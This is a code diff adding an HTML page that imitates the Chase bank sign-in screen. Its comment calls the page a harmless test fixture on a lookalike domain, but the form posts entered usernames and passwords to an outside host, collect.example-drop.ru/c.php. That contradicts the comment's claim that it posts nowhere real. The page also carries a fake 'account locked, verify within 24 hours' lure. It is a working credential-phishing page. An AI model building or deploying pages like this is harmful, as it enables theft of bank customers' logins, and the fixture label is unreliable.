@@ -1,0 +1,13 @@
+<!doctype html>
+<!-- Demo fixture: lookalike bank login. Served as chase-secure-verify.com in tests. Harmless: the form posts nowhere real. -->
+<html><head><title>Chase Online - Sign in</title><meta property="og:site_name" content="Chase"></head>
+<body style="font-family:sans-serif;max-width:420px;margin:40px auto">
+<header><img alt="Chase logo" src="chase-logo.svg" width="120" height="30"></header>
+<h1>Sign in to Chase</h1>
+<p>Your account has been locked due to unusual activity. Verify your identity within 24 hours to avoid suspension.</p>
+<form id="login" action="https://collect.example-drop.ru/c.php" method="post">
+  <label for="u">Username</label><br><input id="u" name="username"><br>
+  <label for="p">Password</label><br><input id="p" name="password" type="password"><br><br>
+  <button>Sign in</button>
+</form>
+</body></html>
